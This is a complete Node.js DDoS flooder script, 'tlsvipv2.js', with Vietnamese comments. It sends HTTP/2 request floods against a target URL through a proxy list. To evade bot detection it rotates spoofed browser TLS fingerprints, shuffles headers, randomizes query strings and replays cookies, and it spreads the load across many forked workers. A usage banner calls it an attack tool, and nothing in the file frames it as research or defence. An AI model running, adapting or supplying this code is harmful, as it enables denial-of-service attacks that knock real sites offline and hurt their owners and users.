const net = require("net");
const http = require('http');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

// --- CẤU HÌNH JA3/TLS FINGERPRINT ROTATION ---
const tlsProfiles = {
    chrome_win10: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
        ciphers: "TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,ECDHE-ECDSA-AES128-GCM-SHA256,ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-RSA-CHACHA20-POLY1305,ECDHE-RSA-AES128-SHA,ECDHE-RSA-AES256-SHA,AES128-GCM-SHA256,AES256-GCM-SHA384,AES128-SHA,AES256-SHA",
        curves: "X25519,P-256,P-384",
        pointFormats: "0x01,0x00",
        alpn: ["h2", "http/1.1"],
        version: "TLSv1.3",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        secCHUA: `".Not/A)Brand";v="99", "Google Chrome";v="108", "Chromium";v="108"`,
        secCHUAMobile: "?0",
        secCHUAPlatform: `"Windows"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    },
    firefox_win10: {
        ja3: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-65037,29-23-24-25-256-257,0",
        ciphers: "TLS_AES_128_GCM_SHA256,TLS_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,ECDHE-ECDSA-AES128-GCM-SHA256,ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-RSA-CHACHA20-POLY1305,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-ECDSA-AES256-SHA,ECDHE-ECDSA-AES128-SHA,ECDHE-RSA-AES128-SHA,ECDHE-RSA-AES256-SHA",
        curves: "X25519,P-256,P-384,P-521",
        pointFormats: "0x00",
        alpn: ["h2", "http/1.1"],
        version: "TLSv1.3", 
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        secCHUA: `".Not/A)Brand";v="99", "Firefox";v="108"`,
        secCHUAMobile: "?0",
        secCHUAPlatform: `"Windows"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    },
    safari_macos: {
        ja3: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
        ciphers: "TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,ECDHE-ECDSA-AES128-GCM-SHA256,ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-RSA-CHACHA20-POLY1305",
        curves: "X25519,P-256,P-384,P-521",
        pointFormats: "0x01,0x00",
        alpn: ["h2", "http/1.1"],
        version: "TLSv1.3",
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        secCHUA: `"Google Chrome";v="108", "Not)A;Brand";v="99", "Safari";v="108"`,
        secCHUAMobile: "?0",
        secCHUAPlatform: `"macOS"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    },
    edge_win11: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
        ciphers: "TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,ECDHE-ECDSA-AES128-GCM-SHA256,ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-RSA-CHACHA20-POLY1305,ECDHE-RSA-AES128-SHA,ECDHE-RSA-AES256-SHA",
        curves: "X25519,P-256,P-384",
        pointFormats: "0x01,0x00",
        alpn: ["h2", "http/1.1"],
        version: "TLSv1.3",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46",
        secCHUA: `".Not/A)Brand";v="99", "Microsoft Edge";v="108", "Chromium";v="108"`,
        secCHUAMobile: "?0",
        secCHUAPlatform: `"Windows"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    },
    chrome_android: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
        ciphers: "TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,ECDHE-ECDSA-AES128-GCM-SHA256,ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-RSA-CHACHA20-POLY1305",
        curves: "X25519,P-256,P-384",
        pointFormats: "0x01,0x00",
        alpn: ["h2", "http/1.1"],
        version: "TLSv1.3",
        userAgent: "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        secCHUA: `".Not/A)Brand";v="99", "Google Chrome";v="108", "Chromium";v="108"`,
        secCHUAMobile: "?1",
        secCHUAPlatform: `"Android"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    }
};

// --- COOKIE MANAGER CLASS ---
class CookieManager {
    constructor() {
        this.cookieJar = new Map();
    }
    
    parseSetCookie(header, domain) {
        if (!header) return null;
        
        const cookies = Array.isArray(header) ? header : [header];
        const parsedCookies = [];
        
        cookies.forEach(cookieStr => {
            if (!cookieStr) return;
            
            const parts = cookieStr.split(';').map(part => part.trim());
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (!name || !value) return;
            
            const cookie = {
                name: name.trim(),
                value: value.trim(),
                domain: domain,
                path: '/',
                expires: null,
                maxAge: null,
                secure: false,
                httpOnly: false
            };
            
            attributes.forEach(attr => {
                const [attrName, attrValue] = attr.split('=');
                const lowerAttr = attrName.toLowerCase();
                
                switch (lowerAttr) {
                    case 'domain':
                        cookie.domain = attrValue || domain;
                        break;
                    case 'path':
                        cookie.path = attrValue || '/';
                        break;
                    case 'expires':
                        cookie.expires = new Date(attrValue);
                        break;
                    case 'max-age':
                        cookie.maxAge = parseInt(attrValue);
                        break;
                    case 'secure':
                        cookie.secure = true;
                        break;
                    case 'httponly':
                        cookie.httpOnly = true;
                        break;
                }
            });
            
            if (this.isValidForDomain(cookie.domain, domain)) {
                parsedCookies.push(cookie);
            }
        });
        
        return parsedCookies;
    }
    
    isValidForDomain(cookieDomain, targetDomain) {
        if (!cookieDomain) return true;
        return targetDomain.endsWith(cookieDomain) || cookieDomain === targetDomain;
    }
    
    addCookies(cookies, domain) {
        if (!cookies || !domain) return;
        
        if (!this.cookieJar.has(domain)) {
            this.cookieJar.set(domain, new Map());
        }
        
        const domainCookies = this.cookieJar.get(domain);
        cookies.forEach(cookie => {
            domainCookies.set(cookie.name, cookie);
        });
    }
    
    getCookiesForDomain(domain) {
        const cookies = [];
        
        this.cookieJar.forEach((domainCookies, cookieDomain) => {
            if (this.isValidForDomain(cookieDomain, domain)) {
                domainCookies.forEach(cookie => {
                    if (cookie.expires && cookie.expires < new Date()) {
                        domainCookies.delete(cookie.name);
                        return;
                    }
                    
                    if (cookie.maxAge && cookie.maxAge <= 0) {
                        domainCookies.delete(cookie.name);
                        return;
                    }
                    
                    cookies.push(`${cookie.name}=${cookie.value}`);
                });
            }
        });
        
        return cookies;
    }
    
    getCookieHeader(domain) {
        const cookies = this.getCookiesForDomain(domain);
        return cookies.length > 0 ? cookies.join('; ') : null;
    }
    
    clearExpired() {
        const now = new Date();
        this.cookieJar.forEach((domainCookies, domain) => {
            domainCookies.forEach((cookie, name) => {
                if (cookie.expires && cookie.expires < now) {
                    domainCookies.delete(name);
                }
                if (cookie.maxAge && cookie.maxAge <= 0) {
                    domainCookies.delete(name);
                }
            });
        });
    }
}

// --- CÁC BIẾN VÀ HÀM HỖ TRỢ ---
const lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'];
const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', '*'];

function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function shuffleHeaders(headersObj) {
    const entries = Object.entries(headersObj);
    for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    return Object.fromEntries(entries);
}

const headerFunc = {
    lang: () => randomElement(lang_header),
    encoding: () => randomElement(encoding_header)
};

function getRandomTLSProfile() {
    const profiles = Object.keys(tlsProfiles);
    return tlsProfiles[profiles[Math.floor(Math.random() * profiles.length)]];
}

function createTLSOptions(profile, servername) {
    const baseOptions = {
        ALPNProtocols: profile.alpn,
        ciphers: profile.ciphers,
        rejectUnauthorized: false,
        honorCipherOrder: true,
        secure: true,
        servername: servername,
        secureProtocol: profile.version === 'TLSv1.3' ? 'TLSv1_3_method' : 'TLSv1_2_method',
        ecdhCurve: profile.curves
    };
    
    return baseOptions;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
    // Bỏ qua lỗi
});

if (process.argv.length < 7) {
    console.log('USE: node tlsvipv2.js <target> <time> <rate> <thread> <proxyfile>');
    console.log('EXAMPLE: node tlsvipv2.js https://example.com 60 128 8 proxy.txt');
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

const blackList = ['https://chinhphu.vn', 'https://ngocphong.com', 'https://virustotal.com', 'https://cloudflare.com', 'https://check-host.cc/', 'https://check-host.net/', 'https://open.spotify.com', 'https://snapchat.com', 'https://usa.gov', 'https://fbi.gov', 'https://nasa.gov', 'https://google.com', 'https://translate.google.com', 'https://github.com', 'https://youtube.com', 'https://facebook.com', 'https://chat.openai.com', 'https://shopee.vn', 'https://mail.google.com', 'https://tiktok.com', 'https://instagram.com', 'https://twitter.com', 'https://telegram.org'];

if (blackList.some(site => args.target.includes(site))) {
  console.log("Trang web này nằm trong danh sách đen.".red);
  process.exit(1);
}

if (args.time <= 0 || args.time > 3000000) {
  console.log("Thời gian tối đa là 300 giây.".red);
  process.exit(1);
}

if (args.Rate <= 0 || args.Rate > 1024) {
  console.log("Rate tối đa là 1024.".red);
  process.exit(1);
}

if (args.threads <= 0 || args.threads > 256) {
  console.log("Số luồng tối đa là 256.".red);
  process.exit(1);
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

function isIPAddress(str) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
    return ipv4Regex.test(str) || ipv6Regex.test(str);
}

// --- FIXED: HÀM RUNFLOODER ĐÃ SỬA ---
function runFlooder() {
    const cookieManager = new CookieManager();
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const currentProfile = getRandomTLSProfile();

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    const Header = new NetSocket();
    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = createTLSOptions(currentProfile, parsedTarget.host);
        tlsOptions.socket = connection;

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 1000);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        client.on("connect", () => {
            // FIXED: Tạo interval cố định trên kết nối đã thiết lập
            const attackInterval = setInterval(() => {
                for (let i = 0; i < Math.floor(args.Rate / 10); i++) {
                    const baseHeaders = {
                        ":method": "GET",
                        ":path": parsedTarget.path + "?" + randomString(8) + "=" + randomString(16),
                        ":scheme": "https",
                        ":authority": parsedTarget.host,
                        "accept": currentProfile.accept,
                        "accept-encoding": headerFunc.encoding(),
                        "accept-language": headerFunc.lang(),
                        "cache-control": "no-cache",
                        "pragma": "no-cache",
                        "sec-ch-ua": currentProfile.secCHUA,
                        "sec-ch-ua-mobile": currentProfile.secCHUAMobile,
                        "sec-ch-ua-platform": currentProfile.secCHUAPlatform,
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": currentProfile.userAgent,
                    };
                    
                    const cookieHeader = cookieManager.getCookieHeader(parsedTarget.host);
                    if (cookieHeader) {
                        baseHeaders['cookie'] = cookieHeader;
                    }
                    
                    const shuffledHeaders = shuffleHeaders(baseHeaders);
                    
                    const request = client.request(shuffledHeaders);
                    request.on("response", response => {
                        if (response.headers['set-cookie']) {
                            const newCookies = cookieManager.parseSetCookie(
                                response.headers['set-cookie'], 
                                parsedTarget.host
                            );
                            if (newCookies && newCookies.length > 0) {
                                cookieManager.addCookies(newCookies, parsedTarget.host);
                            }
                        }
                        request.close();
                    });
                    
                    request.on('error', () => {});
                    request.end();
                }
                cookieManager.clearExpired();
            }, 1000);

            client.on("close", () => {
                clearInterval(attackInterval);
                client.destroy();
                connection.destroy();
            });
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}

// --- FIXED: PHẦN CLUSTER ĐÃ SỬA ---
if (cluster.isMaster) {
    const targetHost = parsedTarget.host;
    const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;

    console.clear();
    console.log('TLS VIP ATTACK - CONSISTENT FINGERPRINT + COOKIE SUPPORT'.rainbow);
    console.log('------------------------------------'.gray);
    console.log(`Target  : ${targetHost}`.cyan);
    console.log(`Time    : ${args.time}s`.cyan);
    console.log(`Threads : ${args.threads}`.cyan);
    console.log(`Rate    : ${args.Rate}`.cyan);
    console.log(`Proxies : ${proxies.length}`.cyan);
    console.log(`Profiles: ${Object.keys(tlsProfiles).length}`.cyan);
    console.log('------------------------------------'.gray);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('Attack completed!'.green);
        process.exit(1);
    }, args.time * 1000);

} else {
    // FIXED: Tạo kết nối cố định thay vì setInterval
    const connectionsPerWorker = 10;
    
    for (let i = 0; i < connectionsPerWorker; i++) {
        setTimeout(() => {
            runFlooder();
        }, i * 1000); // Stagger connections
    }
    
    // Giữ worker sống
    setInterval(() => {
        // Worker maintenance
    }, 60000);
}